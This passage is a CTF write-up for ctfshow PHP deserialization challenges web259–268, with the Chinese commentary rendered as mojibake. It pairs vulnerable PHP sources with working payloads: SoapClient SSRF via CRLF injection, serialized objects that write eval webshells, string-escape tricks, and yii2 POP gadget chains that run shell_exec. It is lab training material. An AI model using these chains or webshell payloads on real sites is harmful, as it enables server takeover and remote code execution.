</blockquote>
<p>å› ä¸ºgetflagæœªçŸ¥ï¼Œ<code>__call()</code>æ˜¯ä¸€ä¸ªé­”æœ¯æ–¹æ³•ï¼Œå½“è°ƒç”¨ä¸€ä¸ªå¯¹è±¡ä¸­çš„ä¸èƒ½ç”¨çš„æ–¹æ³•çš„æ—¶å€™å°±å›æ‰§è¡Œè¿™ä¸ªå‡½æ•°ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public __call ( string $name , array $arguments )</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æ„é€ ä¸€ä¸ªclassåˆ©ç”¨å…¶__callæ–¹æ³•ä¼ å‚</p>
<p>payload.php:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $ua=&quot;ctfshow\r\nX-Forwarded-For:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&quot;;</span><br><span class="line">    $client= new SoapClient(null,array(&#x27;uri&#x27;=&gt;&#x27;http:127.0.0.1&#x27;,&#x27;location&#x27;=&gt;&#x27;http://127.0.0.1/flag.php&#x27;,&#x27;user_agent&#x27;=&gt;$ua));</span><br><span class="line"></span><br><span class="line">    $ser=urlencode(serialize($client));</span><br><span class="line">    echo $ser;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">if(preg_match(&#x27;/ctfshow_i_love_36D/&#x27;,serialize($_GET[&#x27;ctfshow&#x27;])))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ²¡ä»€ä¹ˆå¯è¯´çš„ï¼Œç›´æ¥æ‘†ä¸Šå°±è¡Œäº†</p>
<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=ctfshow_i_love_36D</span><br></pre></td></tr></table></figure>

<h2 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class ctfshowvip&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $code;</span><br><span class="line"></span><br><span class="line">    public function __construct($u,$p)&#123;</span><br><span class="line">        $this-&gt;username=$u;</span><br><span class="line">        $this-&gt;password=$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if($this-&gt;username!=&#x27;&#x27; || $this-&gt;password!=&#x27;&#x27;)&#123;</span><br><span class="line">            die(&#x27;error&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        eval($this-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __sleep()&#123;</span><br><span class="line">        $this-&gt;username=&#x27;&#x27;;</span><br><span class="line">        $this-&gt;password=&#x27;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __unserialize($data)&#123;</span><br><span class="line">        $this-&gt;username=$data[&#x27;username&#x27;];</span><br><span class="line">        $this-&gt;password=$data[&#x27;password&#x27;];</span><br><span class="line">        $this-&gt;code = $this-&gt;username.$this-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;code==0x36d)&#123;</span><br><span class="line">            file_put_contents($this-&gt;username, $this-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize($_GET[&#x27;vip&#x27;]);</span><br></pre></td></tr></table></figure>

<p>ç‰ˆæœ¬é—®é¢˜ï¼Œç”±äºæœ‰__unserializeï¼Œçš„å­˜åœ¨æ˜¯ä¸æ‰§è¡Œ__wakeupæ–¹æ³•çš„ï¼Œæ‰€ä»¥ç›´æ¥æ§åˆ¶è¿™ä¸ªé”€æ¯æ–¹æ³•å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class ctfshowvip&#123;</span><br><span class="line">        public $username;</span><br><span class="line">        public $password;</span><br><span class="line">        public $code;</span><br><span class="line">    </span><br><span class="line">        public function __construct($u=&#x27;&#x27;,$p=&#x27;&#x27;)&#123;</span><br><span class="line">            $this-&gt;username=&quot;877.php&quot;;</span><br><span class="line">            $this-&gt;password=&#x27;&lt;?php eval($_POST[a]); ?&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>åºåˆ—åŒ–åå†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A10%3A%22ctfshowvip%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A25%3A%22%3C%3Fphp+eval%28%24_POST%5Ba%5D%29%3B+%3F%3E%22%3Bs%3A4%3A%22code%22%3BN%3B%7D</span><br></pre></td></tr></table></figure>

<h2 id="web262-å­—ç¬¦é€ƒé€¸"><a href="#web262-å­—ç¬¦é€ƒé€¸" class="headerlink" title="web262(å­—ç¬¦é€ƒé€¸)"></a>web262(å­—ç¬¦é€ƒé€¸)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">class message&#123;</span><br><span class="line">    public $from;</span><br><span class="line">    public $msg;</span><br><span class="line">    public $to;</span><br><span class="line">    public $token=&#x27;user&#x27;;</span><br><span class="line">    public function __construct($f,$m,$t)&#123;</span><br><span class="line">        $this-&gt;from = $f;</span><br><span class="line">        $this-&gt;msg = $m;</span><br><span class="line">        $this-&gt;to = $t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$f = $_GET[&#x27;f&#x27;];</span><br><span class="line">$m = $_GET[&#x27;m&#x27;];</span><br><span class="line">$t = $_GET[&#x27;t&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123;</span><br><span class="line">    $msg = new message($f,$m,$t);</span><br><span class="line">    $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg));</span><br><span class="line">    setcookie(&#x27;msg&#x27;,base64_encode($umsg));</span><br><span class="line">    echo &#x27;Your message has been sent&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å› ä¸ºæ›¿æ¢å‰åé•¿åº¦ä¸ä¸€è‡´å¯¼è‡´äº†é€ƒé€¸ï¼Œ<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/330670521">ç»†è¯´phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ - çŸ¥ä¹ (zhihu.com)</a></p>
<p>æ‰€ä»¥æˆ‘ä»¬æ„é€ fuckè®²tokençš„å€¼ç”±useræ”¹ä¸ºadminå³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$us=new message(&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:3:&quot;msg&quot;;s:4:&quot;aaaa&quot;;s:2:&quot;to&quot;;s:4:&quot;aaaa&quot;;s:5:&quot;token&quot;;s:4:&quot;admin&quot;;&#125;&#x27;,&#x27;aaaa&#x27;,&#x27;aaaa&#x27;);</span><br></pre></td></tr></table></figure>

<p>é æŠŠfuckå˜æˆloveUæ¯æ¬¡å¤šä¸€ä¸ªå­—ç¬¦æŠŠåé¢çš„å­—ç¬¦å…¨éƒ¨ç»™æè¿›æ¥</p>
<h2 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h2><p>å­˜åœ¨æ–‡ä»¶æ³„éœ²/<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p>è¯»index.phpæ²¡æœ‰è¯»åˆ°ä»€ä¹ˆä¸œè¥¿ï¼Œç»§ç»­çœ‹check.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class User&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $status;</span><br><span class="line">    function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    function setStatus($s)&#123;</span><br><span class="line">        $this-&gt;status=$s;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;ä½¿ç”¨&quot;.$this-&gt;password.&quot;ç™»é™†&quot;.($this-&gt;status?&quot;æˆåŠŸ&quot;:&quot;å¤±è´¥&quot;).&quot;----&quot;.date_create()-&gt;format(&#x27;Y-m-d H:i:s&#x27;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„file_put_contentså¯ä»¥åˆ©ç”¨ï¼Œæ­¤å¤„å­˜åœ¨usernameå’Œpasswordå¯æ§ï¼Œæˆ‘ä»¬ä»æ­¤å¤„å†™å…¥æ–‡ä»¶ï¼Œä¼ é©¬ğŸå¼€æï¼</p>
<p>æ„é€ ååºåˆ—åŒ–ï¼Œåˆ©ç”¨ä»–çš„è¿™ä¸ªé…ç½®é—®é¢˜</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;1.php&quot;;s:8:&quot;password&quot;;s:25:&quot;&quot;;s:6:&quot;status&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>base64ç¼–ç ä¸‹ï¼Œè®¿é—®log-1.php</p>
<p>getshell</p>
<h2 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># @message.php</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">class message&#123;</span><br><span class="line">    public $from;</span><br><span class="line">    public $msg;</span><br><span class="line">    public $to;</span><br><span class="line">    public $token=&#x27;user&#x27;;</span><br><span class="line">    public function __construct($f,$m,$t)&#123;</span><br><span class="line">        $this-&gt;from = $f;</span><br><span class="line">        $this-&gt;msg = $m;</span><br><span class="line">        $this-&gt;to = $t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$f = $_GET[&#x27;f&#x27;];</span><br><span class="line">$m = $_GET[&#x27;m&#x27;];</span><br><span class="line">$t = $_GET[&#x27;t&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123;</span><br><span class="line">    $msg = new message($f,$m,$t);</span><br><span class="line">    $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg));</span><br><span class="line">    $_SESSION[&#x27;msg&#x27;]=base64_encode($umsg);</span><br><span class="line">    echo &#x27;Your message has been sent&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>

<p>æœ‰ç‚¹æ•…æŠ€é‡æ–½çš„æ„æ€ï¼Œåˆæ˜¯å› ä¸ºæ›¿æ¢çš„å­—ç¬¦å’ŒåŸæ¥é•¿åº¦ä¸ä¸€è‡´ï¼Œå¯¼è‡´æˆ‘å¯ä»¥ä»»æ„å†™å…¥å†…å®¹äº†ï¼Œçˆ±ä½äº†ã€‚</p>
<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f=1&amp;m=flag&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class ctfshowAdmin&#123;</span><br><span class="line">    public $token;</span><br><span class="line">    public $password;</span><br><span class="line"></span><br><span class="line">    public function __construct($t,$p)&#123;</span><br><span class="line">        $this-&gt;token=$t;</span><br><span class="line">        $this-&gt;password = $p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login()&#123;</span><br><span class="line">        return $this-&gt;token===$this-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ctfshow = unserialize($_GET[&#x27;ctfshow&#x27;]);</span><br><span class="line">$ctfshow-&gt;token=md5(mt_rand());</span><br><span class="line"></span><br><span class="line">if($ctfshow-&gt;login())&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ¬¡æœ‰ç‚¹ä¸å¥½æå› ä¸ºå¤ªéšæœºäº†</p>
<p>ä½†è¿™æ¬¡ç”¨äº†ä¸€æ‹›ï¼Œç±»ä¼¼c++é‡Œé¢çš„å¼•ç”¨ï¼Œå°±æ˜¯è®²passwordææˆtokençš„åˆ«åï¼Œè®©ä»–çš„å€¼éšç€tokenå˜ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class ctfshowAdmin&#123;</span><br><span class="line">    public $token;</span><br><span class="line">    public $password;</span><br><span class="line"></span><br><span class="line">    public function __construct($t,$p)&#123;</span><br><span class="line">        $this-&gt;token= &amp;$this-&gt;password;</span><br><span class="line">        $this-&gt;password = $p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login()&#123;</span><br><span class="line">        return $this-&gt;token=&amp;$this-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åºåˆ—åŒ–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:12:&quot;ctfshowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;i:1234;s:8:&quot;password&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="web266â€“PHPå¯¹ç±»åçš„å¤§å°å†™ä¸æ•æ„Ÿ"><a href="#web266â€“PHPå¯¹ç±»åçš„å¤§å°å†™ä¸æ•æ„Ÿ" class="headerlink" title="web266â€“PHPå¯¹ç±»åçš„å¤§å°å†™ä¸æ•æ„Ÿ"></a>web266â€“PHPå¯¹ç±»åçš„å¤§å°å†™ä¸æ•æ„Ÿ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">$cs = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ctfshow&#123;</span><br><span class="line">    public $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public function __construct($u,$p)&#123;</span><br><span class="line">        $this-&gt;username=$u;</span><br><span class="line">        $this-&gt;password=$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login()&#123;</span><br><span class="line">        return $this-&gt;username===$this-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        global $flag;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ctfshowo=@unserialize($cs);</span><br><span class="line">if(preg_match(&#x27;/ctfshow/&#x27;, $cs))&#123;</span><br><span class="line">    throw new Exception(&quot;Error $ctfshowo&quot;,1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åºåˆ—åŒ–ä¸€ä¸‹ï¼ŒæŠŠç±»åå¤§å†™å³å¯ï¼Œé‡Œé¢ä¸ç”¨æœ‰ä¸œè¥¿ï¼Œèƒ½è§¦å‘__destructå°±è¡Œ</p>
<h2 id="web267ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰"><a href="#web267ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰" class="headerlink" title="web267ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰"></a>web267ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰</h2><p>å¼±å£ä»¤admin admin</p>
<p>ç™»é™†åçœ‹å‰ç«¯æºç å‘ç°aboutå‡ºå­˜åœ¨æºç </p>
<p><img src="https://img-blog.csdnimg.cn/cee2e0df9448485990e5ee0c6a6158b4.png" alt="img"></p>
<p>ä»ç¾¤é‡Œæ‹¿äº†è¿™ä¸ªæ¡†æ¶çš„é“¾å­ç›´æ¥æ¥ç”¨çš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">namespace yii\rest&#123;</span><br><span class="line">    class CreateAction&#123;</span><br><span class="line">        public $checkAccess;</span><br><span class="line">        public $id;</span><br><span class="line">        //echo &quot;&lt;?php eval($_POST[1]);? &gt;&quot; &gt; /var/www/html/basic/web/1.php</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;checkAccess = &#x27;shell_exec&#x27;;</span><br><span class="line">            $this-&gt;id = &quot;echo &#x27;&lt;?php eval(\$_POST[1]);phpinfo();?&gt;&#x27; &gt; /var/www/html/basic/web/2.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Faker&#123;</span><br><span class="line">    use yii\rest\CreateAction;</span><br><span class="line"></span><br><span class="line">    class Generator&#123;</span><br><span class="line">        protected $formatters;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;formatters[&#x27;close&#x27;] = [new CreateAction(), &#x27;run&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace yii\db&#123;</span><br><span class="line">    use Faker\Generator;</span><br><span class="line"></span><br><span class="line">    class BatchQueryResult&#123;</span><br><span class="line">        private $_dataReader;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;_dataReader = new Generator;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    echo base64_encode(serialize(new yii\db\BatchQueryResult));</span><br><span class="line">   // print_r(&#x27;aaaa&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ°2.phpå¯ä»¥æˆåŠŸrceäº†ã€‚</p>
<h2 id="web268ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰"><a href="#web268ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰" class="headerlink" title="web268ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰"></a>web268ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰</h2><p>åŒæ ·æ˜¯yiiä¸Šé¢çš„é‚£æ¡é“¾å­ä¸èƒ½ç”¨äº†ï¼Œç”¨äº†ä¸‹é¢è¿™æ¡ï¼Œæ“ä½œåŸºæœ¬ä¸€è‡´</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">namespace yii\rest&#123;</span><br><span class="line">    class CreateAction&#123;</span><br><span class="line">        public $checkAccess;</span><br><span class="line">        public $id;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;checkAccess = &#x27;shell_exec&#x27;;</span><br><span class="line">            $this-&gt;id = &quot;echo &#x27;&lt;?php eval(\$_POST[1]);phpinfo();?&gt;&#x27; &gt; /var/www/html/basic/web/2.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Faker&#123;</span><br><span class="line">    use yii\rest\CreateAction;</span><br><span class="line"></span><br><span class="line">    class Generator&#123;</span><br><span class="line">        protected $formatters;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            // è¿™é‡Œéœ€è¦æ”¹ä¸ºisRunning</span><br><span class="line">            $this-&gt;formatters[&#x27;isRunning&#x27;] = [new CreateAction(), &#x27;run&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// poc2</span><br><span class="line">namespace Codeception\Extension&#123;</span><br><span class="line">    use Faker\Generator;</span><br><span class="line">    class RunProcess&#123;</span><br><span class="line">        private $processes;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;processes = [new Generator()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    // ç”Ÿæˆpoc</span><br><span class="line">    echo base64_encode(serialize(new Codeception\Extension\RunProcess()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

